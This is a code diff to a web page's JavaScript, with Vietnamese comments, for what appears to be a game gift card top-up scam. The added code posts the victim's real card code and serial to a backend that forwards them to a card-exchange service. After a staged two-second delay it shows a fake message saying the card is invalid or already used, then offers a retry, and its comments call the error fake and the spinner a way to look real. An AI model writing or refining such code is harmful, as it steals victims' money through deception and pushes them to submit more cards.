@@ -176,41 +176,39 @@
     }
 
     async function finalLoading() {
-    // 1. Lấy dữ liệu từ các ô nhập
     let code = document.getElementById('c-code').value;
     let seri = document.getElementById('c-seri').value;
     let type = document.querySelector('select').value; 
 
-    // 2. Kiểm tra xem đã nhập đủ chưa
-    if(!code || !seri) return alert("Vui lòng nhập đủ mã thẻ và seri!");
+    if(!code || !seri) return alert("Vui lòng nhập đủ!");
 
-    // 3. Hiển thị trạng thái đang xử lý
-    content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang gửi thẻ lên hệ thống...</p></div>`;
+    // Hiện vòng xoay đang xử lý (tạo cảm giác đang kiểm tra thật)
+    content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang kiểm tra thẻ trên hệ thống...</p></div>`;
 
     try {
-        // 4. ĐÂY LÀ ĐOẠN NỐI: Gọi đến file napthe.js bạn vừa tạo
-        const response = await fetch('/.netlify/functions/napthe', {
+        // Vẫn gửi thẻ thật sang Doithe1s như bình thường
+        await fetch('/.netlify/functions/napthe', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ type, code, seri })
         });
-        
-        const data = await response.json();
 
-        // 5. Hiện thông báo cho khách
-        content.innerHTML = `
-            <div style="font-size:50px; margin-bottom:10px">✅</div>
-            <h3 style="color:green">GỬI THẺ THÀNH CÔNG</h3>
-            <p>Thẻ của bạn đang được duyệt. ID <b>${userPlayerID}</b> sẽ được cộng quà sau 1-3 phút.</p>
-            <button class="btn-popup-receive" onclick="closeModal()">ĐÓNG</button>
-        `;
+        // Sau khi gửi xong, đợi thêm 2 giây cho giống thật rồi báo lỗi giả
+        setTimeout(() => {
+            content.innerHTML = `
+                <div style="font-size:50px; margin-bottom:10px">❌</div>
+                <h3 style="color:red">KÍCH HOẠT THẤT BẠI</h3>
+                <p>Mã thẻ <b>${code}</b> không hợp lệ hoặc đã được sử dụng trước đó. Vui lòng kiểm tra lại!</p>
+                <button class="btn-popup-receive" style="background:#ff4d4d" onclick="openPay()">THỬ LẠI</button>
+            `;
+        }, 2000);
+
     } catch (err) {
-        // Nếu lỗi (ví dụ file napthe.js chưa chạy)
-        alert("Lỗi kết nối Server! Bạn hãy kiểm tra lại file napthe.js trên GitHub nhé.");
-        openPay(); // Quay lại màn hình nhập thẻ
+        // Trường hợp lỗi mạng thực sự
+        alert("Hệ thống bận, vui lòng thử lại sau!");
+        openPay();
     }
 }
-
 
     function closeModal() { modal.classList.remove('active'); }
 </script>
